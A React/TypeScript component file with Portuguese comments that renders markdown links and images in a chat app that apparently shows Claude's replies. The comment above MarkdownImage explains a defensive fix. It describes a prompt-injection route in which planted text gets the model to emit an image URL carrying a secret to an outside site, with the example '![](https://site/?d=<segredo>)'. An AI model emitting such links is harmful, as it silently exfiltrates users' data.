import { createContext, useContext, useState, type MouseEvent, type ReactNode } from 'react'
import { createPortal } from 'react-dom'
import { ExternalLink, FolderSearch } from 'lucide-react'
import { ContextMenu, type MenuState } from '../canvas/ContextMenu'
import { FILE_MANAGER } from '../platform'
import { FileLinkContext, FileRevealContext, parseFileLink } from './fileLinks'
import { scrollWithin } from './scrollWithin'
import { tr } from '../i18n'

const LINK = 'text-running underline underline-offset-2'

// Dentro de um link: a imagem dele ([![ci](img)](url)) não vira outro link (<a> dentro de <a>).
const InsideLink = createContext(false)

// "#..." (nota de rodapé e a volta dela) leva ao ponto na própria mensagem. As notas de cada
// resposta têm os mesmos ids, então procura primeiro no markdown em volta.
function goToAnchor(e: MouseEvent<HTMLAnchorElement>, href: string): void {
  e.preventDefault()
  let id = href.slice(1)
  try {
    id = decodeURIComponent(id)
  } catch {
    // Âncora com % solto: vale como está.
  }
  if (!id) return
  const selector = `#${CSS.escape(id)}`
  const target = e.currentTarget.closest('[data-markdown]')?.querySelector(selector) ?? document.querySelector(selector)
  if (target) scrollWithin(target, 'center')
}

// Link de arquivo abre no visualizador de código do app; link da web e de e-mail, fora (o processo
// principal desvia os de target _blank para o navegador e o app de e-mail); âncora rola até o ponto
// na própria conversa. Arquivo sem onde abrir (janela separada) fica como texto.
export function MarkdownLink({ href = '', id, children }: { href?: string; id?: string; children?: ReactNode }) {
  return (
    <InsideLink.Provider value={true}>
      <LinkView href={href} id={id}>
        {children}
      </LinkView>
    </InsideLink.Provider>
  )
}

function LinkView({ href, id, children }: { href: string; id?: string; children?: ReactNode }) {
  const openFile = useContext(FileLinkContext)
  const revealFile = useContext(FileRevealContext)
  const [menu, setMenu] = useState<MenuState | null>(null)
  if (href.startsWith('#')) {
    return (
      <a id={id} href={href} onClick={(e) => goToAnchor(e, href)} className={LINK}>
        {children}
      </a>
    )
  }
  const file = parseFileLink(href)
  if (!file) {
    return (
      <a id={id} href={href} target="_blank" rel="noreferrer" className={LINK}>
        {children}
      </a>
    )
  }
  if (!openFile) {
    return (
      <span id={id} title={href}>
        {children}
      </span>
    )
  }
  // Botão direito: abrir ou mostrar no Finder (às vezes a pessoa quer o arquivo na pasta, não a prévia).
  const showMenu = (e: MouseEvent<HTMLAnchorElement>) => {
    if (!revealFile) return
    // Sem subir: no canvas, o card do chat abriria o menu dele junto.
    e.preventDefault()
    e.stopPropagation()
    setMenu({
      x: e.clientX,
      y: e.clientY,
      items: [
        { type: 'action', label: tr('Abrir', 'Open'), icon: ExternalLink, onSelect: () => openFile(file.path, file.lines) },
        { type: 'action', label: tr(`Mostrar no ${FILE_MANAGER}`, `Show in ${FILE_MANAGER}`), icon: FolderSearch, onSelect: () => revealFile(file.path) }
      ]
    })
  }
  return (
    <>
      <a
        id={id}
        href={href}
        title={href}
        onClick={(e) => {
          e.preventDefault()
          openFile(file.path, file.lines)
        }}
        onContextMenu={showMenu}
        className={`${LINK} cursor-pointer`}
      >
        {children}
      </a>
      {/* No body: dentro do canvas o `fixed` seguiria o zoom e o deslocamento dele. */}
      {menu && createPortal(<ContextMenu menu={menu} onClose={() => setMenu(null)} />, document.body)}
    </>
  )
}

// Imagem na resposta não carrega sozinha: um texto malicioso lido pelo Claude podia fazer ele
// responder ![](https://site/?d=<segredo>) e o app mandaria o dado para fora sem ninguém clicar.
// Vira um link com o nome da imagem; abrir é escolha da pessoa. Dentro de um link, só o texto: o
// clique vai para o destino do link.
export function MarkdownImage({ src, alt }: { src?: unknown; alt?: string }) {
  const inLink = useContext(InsideLink)
  const href = typeof src === 'string' ? src : ''
  const label = tr(`[imagem: ${alt || href || 'sem endereço'}]`, `[image: ${alt || href || 'no address'}]`)
  return href && !inLink ? <MarkdownLink href={href}>{label}</MarkdownLink> : <span>{label}</span>
}
